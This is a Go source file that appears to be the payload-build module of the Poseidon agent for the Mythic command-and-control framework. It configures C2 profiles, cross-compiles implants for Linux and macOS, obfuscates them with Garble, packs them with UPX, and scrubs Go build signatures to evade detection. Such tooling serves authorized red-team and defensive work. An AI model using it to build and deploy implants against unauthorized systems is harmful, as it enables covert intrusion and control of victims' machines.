package agentfunctions

import (
	"archive/zip"
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"slices"
	"strconv"
	"strings"
	"time"

	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
	"github.com/MythicMeta/MythicContainer/mythicrpc"
	"github.com/google/uuid"
	"github.com/pelletier/go-toml"
)

const version = "2.3.3"

type sleepInfoStruct struct {
	Interval int       `json:"interval"`
	Jitter   int       `json:"jitter"`
	KillDate time.Time `json:"killdate"`
}

var badSigs = [][]byte{
	{'G', 'o', ' ', 'b', 'u', 'i', 'l', 'd'},
	{'g', 'o', '.', 'b', 'u', 'i', 'l', 'd'},
}
var payloadDefinition = agentstructs.PayloadType{
	Name:                                   "poseidon",
	SemVer:                                 version,
	FileExtension:                          "bin",
	Author:                                 "@xorrior, @djhohnstein, @Ne0nd0g, @its_a_feature_",
	SupportedOS:                            []string{agentstructs.SUPPORTED_OS_LINUX, agentstructs.SUPPORTED_OS_MACOS},
	Wrapper:                                false,
	CanBeWrappedByTheFollowingPayloadTypes: []string{},
	SupportsDynamicLoading:                 true,
	Description:                            "A fully featured macOS and Linux Golang agent.\nNeeds Mythic 3.3.0+\nNOTE: P2P not compatible with v2.1 agents!",
	SupportedC2Profiles:                    []string{"http", "websocket", "tcp", "dynamichttp", "webshell", "httpx", "dns"},
	MythicEncryptsData:                     true,
	BuildParameters: []agentstructs.BuildParameter{
		{
			Name:          "mode",
			Description:   "Choose the build mode option. Select default for executables, c-shared for a .dylib or .so file, or c-archive for a .Zip containing C source code with an archive and header file",
			Required:      false,
			DefaultValue:  "default",
			Choices:       []string{"default", "c-archive", "c-shared"},
			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_CHOOSE_ONE,
			HideConditions: []agentstructs.BuildParameterHideCondition{
				{
					Name:    "architecture",
					Operand: agentstructs.HideConditionOperandIN,
					Choices: []string{"MIPS", "MIPSLE", "MIPS64", "MIPS64LE"},
				},
			},
			UiPosition: 2,
		},
		{
			Name:                 "architecture",
			Description:          "Choose the agent's architecture",
			Required:             false,
			DefaultValue:         "AMD_x64",
			Choices:              []string{"AMD_x64", "ARM_x64", "MIPS", "MIPSLE", "MIPS64", "MIPS64LE"},
			ParameterType:        agentstructs.BUILD_PARAMETER_TYPE_CHOOSE_ONE,
			DynamicQueryFunction: getArchitectureChoices,
			UiPosition:           1,
		},
		{
			Name:          "float",
			Description:   "Chose hard float or soft float. Soft float runs on all mips chips, but performs math operations more slowly.",
			Required:      false,
			Choices:       []string{"softfloat", "hardfloat"},
			DefaultValue:  "softfloat",
			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_CHOOSE_ONE,
			HideConditions: []agentstructs.BuildParameterHideCondition{
				{
					Name:    "architecture",
					Operand: agentstructs.HideConditionOperandNotIN,
					Choices: []string{"MIPS", "MIPSLE", "MIPS64", "MIPS64LE"},
				},
			},
			UiPosition: 3,
		},
		{
			Name:          "proxy_bypass",
			Description:   "Ignore HTTP proxy environment settings configured on the target host?",
			Required:      false,
			DefaultValue:  false,
			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_BOOLEAN,
			GroupName:     "egress",
			UiPosition:    11,
		},
		{
			Name:          "garble",
			Description:   "Use Garble to obfuscate the output Go executable.\nWARNING - This significantly slows the agent build time.",
			Required:      false,
			DefaultValue:  false,
			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_BOOLEAN,
			UiPosition:    5,
		},
		{
			Name:          "debug",
			Description:   "Create a debug build with print statements for debugging.",
			Required:      false,
			DefaultValue:  false,
			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_BOOLEAN,
			UiPosition:    4,
		},
		{
			Name:          "upx",
			Description:   "Compress the final Linux executable with upx",
			Required:      false,
			DefaultValue:  false,
			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_BOOLEAN,
			SupportedOS:   []string{agentstructs.SUPPORTED_OS_LINUX},
			HideConditions: []agentstructs.BuildParameterHideCondition{
				{
					Name:    "mode",
					Operand: agentstructs.HideConditionOperandNotIN,
					Choices: []string{"default"},
				},
			},
			UiPosition: 7,
		},
		{
			Name:          "egress_order",
			Description:   "Prioritize the order in which egress connections are made (if including multiple egress c2 profiles)",
			Required:      false,
			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_ARRAY,
			DefaultValue:  []string{"http", "websocket", "dynamichttp", "httpx"},
			GroupName:     "egress",
			UiPosition:    8,
		},
		{
			Name:          "egress_failover",
			Description:   "How should egress mechanisms rotate",
			Required:      false,
			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_CHOOSE_ONE,
			Choices:       []string{"failover"},
			DefaultValue:  "failover",
			GroupName:     "egress",
			UiPosition:    9,
		},
		{
			Name:          "failover_threshold",
			Description:   "How many failed attempts should cause a rotate of egress comms",
			Required:      false,
			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_NUMBER,
			DefaultValue:  10,
			GroupName:     "egress",
			UiPosition:    10,
		},
		{
			Name:          "static",
			Description:   "Statically compile the payload",
			Required:      false,
			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_BOOLEAN,
			DefaultValue:  false,
			HideConditions: []agentstructs.BuildParameterHideCondition{
				{
					Name:    "architecture",
					Operand: agentstructs.HideConditionOperandIN,
					Choices: []string{"MIPS", "MIPSLE", "MIPS64", "MIPS64LE"},
				},
			},
			SupportedOS: []string{agentstructs.SUPPORTED_OS_LINUX},
			UiPosition:  6,
		},
	},
	SupportsMultipleC2InBuild: true,
	C2ParameterDeviations: map[string]map[string]agentstructs.C2ParameterDeviation{
		"http": {
			"get_uri": {
				Supported: false,
			},
			"query_path_name": {
				Supported: false,
			},
		},
	},
	BuildSteps: []agentstructs.BuildStep{
		{
			Name:        "Configuring",
			Description: "Cleaning up configuration values and generating the golang build command",
		},
		{
			Name:        "Garble",
			Description: "Adding in Garble (obfuscation)",
		},
		{
			Name:        "Upx",
			Description: "Add in Upx compression to shrink the payload size",
		},
		{
			Name:        "Compiling",
			Description: "Compiling the golang agent",
		},
	},
	CheckIfCallbacksAliveFunction: func(message agentstructs.PTCheckIfCallbacksAliveMessage) agentstructs.PTCheckIfCallbacksAliveMessageResponse {
		response := agentstructs.PTCheckIfCallbacksAliveMessageResponse{Success: true, Callbacks: make([]agentstructs.PTCallbacksToCheckResponse, 0)}
		for _, callback := range message.Callbacks {
			//logging.LogInfo("callback info", "callback", callback)
			if callback.SleepInfo == "" {
				continue // can't do anything if we don't know the expected sleep info of the agent
			}
			sleepInfo := map[string]sleepInfoStruct{}
			err := json.Unmarshal([]byte(callback.SleepInfo), &sleepInfo)
			if err != nil {
				//logging.LogError(err, "failed to parse sleep info struct")
				continue
			}
			atLeastOneCallbackWithinRange := false
			for activeC2, _ := range sleepInfo {
				if activeC2 == "websocket" && callback.LastCheckin.Unix() == 0 {
					atLeastOneCallbackWithinRange = true
					continue
				}
				if activeC2 == "tcp" {
					atLeastOneCallbackWithinRange = true
					continue
				}
				maxAdd := sleepInfo[activeC2].Interval
				if sleepInfo[activeC2].Jitter > 0 {
					// maximum would be sleep_interval + (sleep_jitter % of sleep_interval)
					maxAdd = maxAdd + ((sleepInfo[activeC2].Jitter / 100) * (sleepInfo[activeC2].Interval))
				}
				maxAdd *= 2 // double the high end in case we're on a close boundary
				latest := callback.LastCheckin.Add(time.Duration(maxAdd) * time.Second)
				if time.Now().UTC().Before(latest) {
					atLeastOneCallbackWithinRange = true
					break
				}
			}
			response.Callbacks = append(response.Callbacks, agentstructs.PTCallbacksToCheckResponse{
				ID:    callback.ID,
				Alive: atLeastOneCallbackWithinRange,
			})
		}
		return response
	},
}

func getArchitectureChoices(message agentstructs.PTRPCDynamicQueryBuildParameterFunctionMessage) agentstructs.PTRPCDynamicQueryBuildParameterFunctionMessageResponse {
	switch message.SelectedOS {
	case agentstructs.SUPPORTED_OS_LINUX:
		return agentstructs.PTRPCDynamicQueryBuildParameterFunctionMessageResponse{
			Success: true,
			Choices: []string{"AMD_x64", "ARM_x64", "MIPS", "MIPSLE", "MIPS64", "MIPS64LE"},
		}
	case agentstructs.SUPPORTED_OS_MACOS:
		return agentstructs.PTRPCDynamicQueryBuildParameterFunctionMessageResponse{
			Success: true,
			Choices: []string{"AMD_x64", "ARM_x64"},
		}
	default:
		return agentstructs.PTRPCDynamicQueryBuildParameterFunctionMessageResponse{
			Success: false,
			Error:   fmt.Sprintf("unsupported operating system %q", message.SelectedOS),
		}
	}
}

func resolveGoArchitecture(architecture string) (string, error) {
	switch architecture {
	case "AMD_x64":
		return "amd64", nil
	case "ARM_x64":
		return "arm64", nil
	case "MIPS":
		return "mips", nil
	case "MIPSLE":
		return "mipsle", nil
	case "MIPS64":
		return "mips64", nil
	case "MIPS64LE":
		return "mips64le", nil
	default:
		return "", fmt.Errorf("Unsupported Architecture: %s", architecture)
	}
}

func resolveTargetOs(payloadBuildMsg agentstructs.PayloadBuildMessage) (string, error) {
	switch payloadBuildMsg.SelectedOS {
	case agentstructs.SUPPORTED_OS_LINUX:
		return "linux", nil
	case agentstructs.SUPPORTED_OS_MACOS:
		return "darwin", nil
	default:
		return "", fmt.Errorf("Poseidon does not support operating system %q", payloadBuildMsg.SelectedOS)
	}
}

func build(payloadBuildMsg agentstructs.PayloadBuildMessage) agentstructs.PayloadBuildResponse {
	payloadBuildResponse := agentstructs.PayloadBuildResponse{
		PayloadUUID:        payloadBuildMsg.PayloadUUID,
		Success:            true,
		UpdatedCommandList: &payloadBuildMsg.CommandList,
	}
	buildError := func(stdError string) agentstructs.PayloadBuildResponse {
		payloadBuildResponse.Success = false
		payloadBuildResponse.BuildStdErr = stdError
		return payloadBuildResponse
	}

	if len(payloadBuildMsg.C2Profiles) == 0 {
		return buildError("Failed to build - must select at least one C2 Profile")
	}

	targetOs, err := resolveTargetOs(payloadBuildMsg)
	if err != nil {
		return buildError(err.Error())
	}

	egress_order, err := payloadBuildMsg.BuildParameters.GetArrayArg("egress_order")
	if err != nil {
		return buildError(err.Error())
	}
	egress_failover, err := payloadBuildMsg.BuildParameters.GetChooseOneArg("egress_failover")
	if err != nil {
		return buildError(err.Error())
	}
	debug, err := payloadBuildMsg.BuildParameters.GetBooleanArg("debug")
	if err != nil {
		return buildError(err.Error())
	}
	architecture, err := payloadBuildMsg.BuildParameters.GetStringArg("architecture")
	if err != nil {
		return buildError(err.Error())
	}
	static, err := payloadBuildMsg.BuildParameters.GetBooleanArg("static")
	if err != nil {
		return buildError(err.Error())
	}
	if strings.HasPrefix(architecture, "MIPS") && targetOs == "linux" {
		static = true
	}
	if static && targetOs == "darwin" {
		return buildError("Cannot currently build fully static library for macOS")
	}
	failedConnectionCountThresholdString, err := payloadBuildMsg.BuildParameters.GetNumberArg("failover_threshold")
	if err != nil {
		return buildError(err.Error())
	}
	proxyBypass, err := payloadBuildMsg.BuildParameters.GetBooleanArg("proxy_bypass")
	if err != nil {
		return buildError(err.Error())
	}
	mode, err := payloadBuildMsg.BuildParameters.GetStringArg("mode")
	if err != nil {
		return buildError(err.Error())
	}
	useUpx, err := payloadBuildMsg.BuildParameters.GetBooleanArg("upx")
	if err != nil {
		return buildError(err.Error())
	}
	if useUpx && (targetOs != "linux" || mode != "default") {
		return buildError("UPX is only supported for Linux executable builds")
	}
	garble, err := payloadBuildMsg.BuildParameters.GetBooleanArg("garble")
	if err != nil {
		return buildError(err.Error())
	}
	// This package path is used with Go's "-X" link flag to set the value string variables in code at compile
	// time. This is how each profile's configurable options are passed in.
	poseidon_repo_profile := "github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/profiles"
	poseidon_repo_utils := "github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils"

	// Build Go link flags that are passed in at compile time through the "-ldflags=" argument
	// https://golang.org/cmd/link/
	buildLdFlags := []string{}
	// leaving in old fmt.Sprintf format now as sanity checking, but will remove at some point since it's unused
	if static {
		buildLdFlags = append(buildLdFlags, "-extldflags=-static", "-s", "-w", "-X",
			fmt.Sprintf("'%s.UUID=%s'", poseidon_repo_profile, payloadBuildMsg.PayloadUUID))
	} else {
		buildLdFlags = append(buildLdFlags, "-s", "-w", "-X",
			fmt.Sprintf("'%s.UUID=%s'", poseidon_repo_profile, payloadBuildMsg.PayloadUUID))
	}
	buildLdFlags = append(buildLdFlags, "-X", fmt.Sprintf("'%s.debugString=%v'", poseidon_repo_utils, debug))
	buildLdFlags = append(buildLdFlags, "-X", fmt.Sprintf("'%s.egress_failover=%s'", poseidon_repo_profile, egress_failover))
	buildLdFlags = append(buildLdFlags, "-X", fmt.Sprintf("'%s.failedConnectionCountThresholdString=%v'", poseidon_repo_profile, failedConnectionCountThresholdString))
	egressBytes, err := json.Marshal(egress_order)
	if err != nil {
		return buildError(err.Error())
	}
	stringBytes := base64.StdEncoding.EncodeToString(egressBytes)
	//stringBytes = strings.ReplaceAll(stringBytes, "\"", "\\\"")
	buildLdFlags = append(buildLdFlags, "-X", fmt.Sprintf("'%s.egress_order=%s'", poseidon_repo_profile, stringBytes))
	// Iterate over the C2 profile parameters and associated variable through Go's "-X" link flag
	for index := range payloadBuildMsg.C2Profiles {
		initialConfig := make(map[string]interface{})
		for _, key := range payloadBuildMsg.C2Profiles[index].GetArgNames() {
			if key == "AESPSK" {
				//cryptoVal := val.(map[string]interface{})
				cryptoVal, err := payloadBuildMsg.C2Profiles[index].GetCryptoArg(key)
				if err != nil {
					return buildError("Key error: " + key + "\n" + err.Error())
				}
				initialConfig[key] = cryptoVal.EncKey
				//ldflags += fmt.Sprintf(" -X '%s.%s_%s=%s'", poseidon_repo_profile, payloadBuildMsg.C2Profiles[index].Name, key, cryptoVal.EncKey)
			} else if key == "headers" {
				headers, err := payloadBuildMsg.C2Profiles[index].GetDictionaryArg(key)
				if err != nil {
					return buildError("Key error: " + key + "\n" + err.Error())
				}
				initialConfig[key] = headers
			} else if key == "raw_c2_config" {
				agentConfigString, err := payloadBuildMsg.C2Profiles[index].GetStringArg(key)
				if err != nil {
					return buildError("Key error: " + key + "\n" + err.Error())
				}
				configData, err := mythicrpc.SendMythicRPCFileGetContent(mythicrpc.MythicRPCFileGetContentMessage{
					AgentFileID: agentConfigString,
				})
				if err != nil {
					return buildError("Key error: " + key + "\n" + err.Error())
				}
				if !configData.Success {
					return buildError("Key error: " + key + "\n" + configData.Error)
				}
				tomlConfig := make(map[string]interface{})
				err = json.Unmarshal(configData.Content, &tomlConfig)
				if err != nil {
					err = toml.Unmarshal(configData.Content, &tomlConfig)
					if err != nil {
						return buildError("Key error: " + key + "\n" + err.Error())
					}
				}
				initialConfig[key] = tomlConfig
			} else if slices.Contains([]string{"callback_jitter", "callback_interval", "callback_port", "port", "callback_port", "failover_threshold", "max_query_length", "max_subdomain_length"}, key) {

				val, err := payloadBuildMsg.C2Profiles[index].GetNumberArg(key)
				if err != nil {
					stringVal, err := payloadBuildMsg.C2Profiles[index].GetStringArg(key)
					if err != nil {
						return buildError("Key error: " + key + "\n" + err.Error())
					}
					realVal, err := strconv.Atoi(stringVal)
					if err != nil {
						return buildError("Key error: " + key + "\n" + err.Error())
					}
					initialConfig[key] = realVal
				} else {
					initialConfig[key] = int(val)
				}

				//ldflags += fmt.Sprintf(" -X '%s.%s_%s=%v'", poseidon_repo_profile, payloadBuildMsg.C2Profiles[index].Name, key, val)
			} else if slices.Contains([]string{"encrypted_exchange_check", "localhost_only"}, key) {
				val, err := payloadBuildMsg.C2Profiles[index].GetBooleanArg(key)
				if err != nil {
					stringVal, err := payloadBuildMsg.C2Profiles[index].GetStringArg(key)
					if err != nil {
						return buildError("Key error: " + key + "\n" + err.Error())
					}
					initialConfig[key] = stringVal == "T"
				} else {
					initialConfig[key] = val
				}
			} else if slices.Contains([]string{"callback_domains", "domains"}, key) {
				val, err := payloadBuildMsg.C2Profiles[index].GetArrayArg(key)
				if err != nil {
					return buildError("Key error: " + key + "\n" + err.Error())
				}
				initialConfig[key] = val
			} else {
				val, err := payloadBuildMsg.C2Profiles[index].GetStringArg(key)
				if err != nil {
					return buildError("Key error: " + key + "\n" + err.Error())
				}
				if key == "proxy_port" {
					if val == "" {
						initialConfig[key] = 0
					} else {
						intval, err := strconv.Atoi(val)
						if err != nil {
							return buildError("Key error: " + key + "\n" + err.Error())
						}
						initialConfig[key] = intval
					}
				} else {
					initialConfig[key] = val
				}

			}
		}
		initialConfigBytes, err := json.Marshal(initialConfig)
		if err != nil {
			return buildError(err.Error())
		}
		initialConfigBase64 := base64.StdEncoding.EncodeToString(initialConfigBytes)
		payloadBuildResponse.BuildStdOut += fmt.Sprintf("%s's config: \n%v\n", payloadBuildMsg.C2Profiles[index].Name, string(initialConfigBytes))
		buildLdFlags = append(buildLdFlags, "-X",
			fmt.Sprintf("'%s.%s_%s=%v'", poseidon_repo_profile, payloadBuildMsg.C2Profiles[index].Name, "initial_config", initialConfigBase64))
	}

	buildLdFlags = append(buildLdFlags, "-X", fmt.Sprintf("'%s.proxy_bypass=%v'", poseidon_repo_profile, proxyBypass))
	buildLdFlags = append(buildLdFlags, "-buildid=")

	goarch, err := resolveGoArchitecture(architecture)
	if err != nil {
		return buildError(err.Error())
	}

	tags := []string{}
	if static {
		tags = []string{"osusergo", "netgo"}
	}
	for index := range payloadBuildMsg.C2Profiles {
		tags = append(tags, payloadBuildMsg.C2Profiles[index].Name)
	}
	if mode == "c-shared" {
		tags = append(tags, "shared")
	}
	tags = append(tags, payloadBuildMsg.CommandList...)

	isMIPS := strings.HasPrefix(goarch, "mips")
	isMIPS64 := strings.HasPrefix(goarch, "mips64")

	floatABI := ""
	if isMIPS {
		floatABI, err = payloadBuildMsg.BuildParameters.GetStringArg("float")
		if err != nil {
			return buildError(err.Error())
		}

		if floatABI != "softfloat" && floatABI != "hardfloat" {
			return buildError(fmt.Sprintf("unsupported MIPS float ABI: %q", floatABI))
		}
	}

	var commandEnv []string
	if isMIPS && targetOs != "linux" {
		return buildError("MIPS architectures are only supported for linux")
	}
	if isMIPS && mode != "default" {
		return buildError("MIPS currently supports only default executable builds")
	}
	if isMIPS {
		commandEnv = []string{"CGO_ENABLED=0",
			fmt.Sprintf("GOOS=%s", targetOs),
			fmt.Sprintf("GOARCH=%s", goarch),
		}
		if isMIPS64 {
			commandEnv = append(commandEnv, "GOMIPS64="+floatABI)
		} else {
			commandEnv = append(commandEnv, "GOMIPS="+floatABI)
		}
	} else {
		commandEnv = []string{"CGO_ENABLED=1",
			fmt.Sprintf("GOOS=%s", targetOs),
			fmt.Sprintf("GOARCH=%s", goarch),
		}
	}

	if targetOs == "darwin" {
		commandEnv = append(commandEnv, "CC=o64-clang", "CXX=o64-clang++")
	} else { // linux
		switch goarch {
		case "arm64":
			commandEnv = append(commandEnv, "CC=aarch64-linux-gnu-gcc")
		case "amd64":
			commandEnv = append(commandEnv, "CC=x86_64-linux-gnu-gcc")
		}
	}
	commandEnv = append(commandEnv, "GOGARBLE=*")
	commandExec := []string{"go", "build"}
	if garble {
		commandExec = []string{"garble", "-tiny", "-literals", "-debug", "-seed", "random", "build"}
	}
	payloadName := fmt.Sprintf("%s-%s", payloadBuildMsg.PayloadUUID, targetOs)

	macOSVersion := "10.12"
	if targetOs == "darwin" {
		payloadName += fmt.Sprintf("-%s", macOSVersion)
	}
	payloadName += fmt.Sprintf("-%s", goarch)
	switch mode {
	case "c-shared":
		if targetOs == "darwin" {
			payloadName += ".dylib"
		} else {
			payloadName += ".so"
		}
	case "c-archive":
		payloadName += ".a"
	}

	commandExec = append(commandExec,
		"-tags", strings.Join(tags, ","),
		"-buildmode", mode,
		"-ldflags", fmt.Sprintf("%s", strings.Join(buildLdFlags, " ")),
		"-o", "/build/"+payloadName)

	cmd := exec.Command(commandExec[0], commandExec[1:]...)
	cmd.Env = append(os.Environ(), commandEnv...)
	cmd.Dir = "./poseidon/agent_code/"

	mythicrpc.SendMythicRPCPayloadUpdateBuildStep(mythicrpc.MythicRPCPayloadUpdateBuildStepMessage{
		PayloadUUID: payloadBuildMsg.PayloadUUID,
		StepName:    "Configuring",
		StepSuccess: true,
		StepStdout:  fmt.Sprintf("Successfully configured\nEnv additions: %q\nCommand arguments: %q", commandEnv, cmd.Args),
	})
	if garble {
		mythicrpc.SendMythicRPCPayloadUpdateBuildStep(mythicrpc.MythicRPCPayloadUpdateBuildStepMessage{
			PayloadUUID: payloadBuildMsg.PayloadUUID,
			StepName:    "Garble",
			StepSuccess: true,
			StepStdout:  "Successfully added in garble\n",
		})
	} else {
		mythicrpc.SendMythicRPCPayloadUpdateBuildStep(mythicrpc.MythicRPCPayloadUpdateBuildStepMessage{
			PayloadUUID: payloadBuildMsg.PayloadUUID,
			StepName:    "Garble",
			StepSkip:    true,
			StepStdout:  "Skipped Garble\n",
		})
	}

	var stdout bytes.Buffer
	var stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr
	err = cmd.Run()
	if err != nil {
		payloadBuildResponse.Success = false
		payloadBuildResponse.BuildMessage = "Compilation failed with errors"
		payloadBuildResponse.BuildStdErr += stderr.String() + "\n" + err.Error()
		payloadBuildResponse.BuildStdOut += stdout.String()
		mythicrpc.SendMythicRPCPayloadUpdateBuildStep(mythicrpc.MythicRPCPayloadUpdateBuildStepMessage{
			PayloadUUID: payloadBuildMsg.PayloadUUID,
			StepName:    "Compiling",
			StepSuccess: false,
			StepStdout:  fmt.Sprintf("failed to compile\n%s\n%s\n%s", stderr.String(), stdout.String(), err.Error()),
		})
		return payloadBuildResponse
	}
	outputString := stdout.String()
	if !garble {
		// only adding stderr if garble is false, otherwise it's too much data
		outputString += "\n" + stderr.String()
	}

	mythicrpc.SendMythicRPCPayloadUpdateBuildStep(mythicrpc.MythicRPCPayloadUpdateBuildStepMessage{
		PayloadUUID: payloadBuildMsg.PayloadUUID,
		StepName:    "Compiling",
		StepSuccess: true,
		StepStdout:  fmt.Sprintf("Successfully executed\n%s", outputString),
	})

	if !garble {
		payloadBuildResponse.BuildStdErr = stderr.String()
	}
	payloadBuildResponse.BuildStdOut += stdout.String()

	payloadPath := filepath.Join("/build", payloadName)
	if useUpx {
		upxCmd := exec.Command("upx", "-9", "--no-lzma", payloadPath)

		var upxStdout bytes.Buffer
		var upxStderr bytes.Buffer
		upxCmd.Stdout = &upxStdout
		upxCmd.Stderr = &upxStderr

		if err := upxCmd.Run(); err != nil {
			mythicrpc.SendMythicRPCPayloadUpdateBuildStep(
				mythicrpc.MythicRPCPayloadUpdateBuildStepMessage{
					PayloadUUID: payloadBuildMsg.PayloadUUID,
					StepName:    "UPX",
					StepSuccess: false,
					StepStdout:  upxStdout.String(),
					StepStderr:  upxStderr.String(),
				},
			)
			return buildError("UPX compression failed: " + err.Error())
		}

		if output, err := exec.Command("upx", "-t", payloadPath).CombinedOutput(); err != nil {
			return buildError(fmt.Sprintf("UPX integrity check failed: %v\n%s", err, output))
		}
	}

	if payloadBytes, err := os.ReadFile(fmt.Sprintf("/build/%s", payloadName)); err != nil {
		payloadBuildResponse.Success = false
		payloadBuildResponse.BuildMessage = "Failed to find final payload"
	} else if mode == "c-archive" && targetOs == "darwin" {
		zipUUID := uuid.New().String()
		archive, err := os.Create(fmt.Sprintf("/build/%s", zipUUID))
		if err != nil {
			payloadBuildResponse.BuildMessage = "Failed to make temp archive on disk"
			return buildError(err.Error())
		}
		zipWriter := zip.NewWriter(archive)
		fileWriter, err := zipWriter.Create("poseidon-darwin-10.12-amd64.a")
		if err != nil {
			payloadBuildResponse.BuildMessage = "Failed to save payload to zip"
			archive.Close()
			return buildError(err.Error())
		}
		_, err = io.Copy(fileWriter, bytes.NewReader(payloadBytes))
		if err != nil {
			payloadBuildResponse.BuildMessage = "Failed to write payload to zip"
			archive.Close()
			return buildError(err.Error())
		}
		headerName := fmt.Sprintf("%s.h", payloadName[:len(payloadName)-2])
		headerWriter, err := zipWriter.Create("poseidon-darwin-10.12-amd64.h")
		if err != nil {
			payloadBuildResponse.BuildMessage = "Failed to save header to zip"
			archive.Close()
			return buildError(err.Error())
		}
		headerFile, err := os.Open(fmt.Sprintf("/build/%s", headerName))
		if err != nil {
			payloadBuildResponse.BuildMessage = "Failed to open header to zip"
			archive.Close()
			return buildError(err.Error())
		}
		_, err = io.Copy(headerWriter, headerFile)
		if err != nil {
			payloadBuildResponse.BuildMessage = "Failed to write header to zip"
			archive.Close()
			return buildError(err.Error())
		}
		sharedWriter, err := zipWriter.Create("sharedlib-darwin-linux.c")
		if err != nil {
			payloadBuildResponse.BuildMessage = "Failed to save payload to zip"
			archive.Close()
			return buildError(err.Error())
		}
		sharedLib, err := os.Open("./poseidon/agent_code/sharedlib/sharedlib-darwin-linux.c")
		if err != nil {
			payloadBuildResponse.BuildMessage = "Failed to save sharedlib to zip"
			archive.Close()
			return buildError(err.Error())
		}
		_, err = io.Copy(sharedWriter, sharedLib)
		if err != nil {
			payloadBuildResponse.BuildMessage = "Failed to write sharedlib to zip"
			archive.Close()
			return buildError(err.Error())
		}
		zipWriter.Close()
		archive.Close()
		archiveBytes, err := os.ReadFile(fmt.Sprintf("/build/%s", zipUUID))
		if err != nil {
			payloadBuildResponse.BuildMessage = "Failed to read final zip"
			return buildError(err.Error())
		}
		payloadBuildResponse.Payload = &archiveBytes
		payloadBuildResponse.Success = true
		payloadBuildResponse.BuildMessage = "Successfully built payload!"
		if !strings.HasSuffix(payloadBuildMsg.Filename, ".zip") {
			updatedFilename := fmt.Sprintf("%s.zip", payloadBuildMsg.Filename)
			payloadBuildResponse.UpdatedFilename = &updatedFilename
		}
	} else {
		if garble {
			fileName := fmt.Sprintf("/build/%s", payloadName)
			for i, _ := range badSigs {
				replacement := make([]byte, len(badSigs[i]))
				for j, _ := range replacement {
					replacement[j] = ' ' // keep same size, just change to spaces
				}
				payloadBytes = bytes.ReplaceAll(payloadBytes, badSigs[i], replacement)
			}
			// now need to run /rcodesign to "fix" the broke sigs for macOS
			if targetOs == "darwin" {
				err = os.WriteFile(fileName, payloadBytes, 0644)
				if err != nil {
					payloadBuildResponse.BuildMessage = "Failed to write out modified garble payload!\n" + stderr.String()
					return buildError(err.Error())
				}
				cmd = exec.Command("/rcodesign", "sign", fileName)
				cmd.Stderr = &stderr
				err = cmd.Run()
				if err != nil {
					payloadBuildResponse.BuildMessage = "Failed to sign payload!\n" + stderr.String()
					return buildError(err.Error())
				}
				payloadBytes, err = os.ReadFile(fileName)
				if err != nil {
					payloadBuildResponse.BuildMessage = "Failed to read signed payload!\n" + stderr.String()
					return buildError(err.Error())
				}
			}
		}
		payloadBuildResponse.Payload = &payloadBytes
		payloadBuildResponse.Success = true
		payloadBuildResponse.BuildMessage = "Successfully built payload!"
	}

	//payloadBuildResponse.Status = agentstructs.PAYLOAD_BUILD_STATUS_ERROR
	return payloadBuildResponse
}

// dummy example function for executing something on a new poseidon callback
func onNewCallback(data agentstructs.PTOnNewCallbackAllData) agentstructs.PTOnNewCallbackResponse {
	return agentstructs.PTOnNewCallbackResponse{
		AgentCallbackID: data.Callback.AgentCallbackID,
		Success:         true,
		Error:           "",
	}
}
func Initialize() {
	agentstructs.AllPayloadData.Get("poseidon").AddPayloadDefinition(payloadDefinition)
	agentstructs.AllPayloadData.Get("poseidon").AddBuildFunction(build)
	//agentstructs.AllPayloadData.Get("poseidon").AddOnNewCallbackFunction(onNewCallback)
	agentstructs.AllPayloadData.Get("poseidon").AddIcon(filepath.Join(".", "poseidon", "agentfunctions", "poseidon.svg"))
}
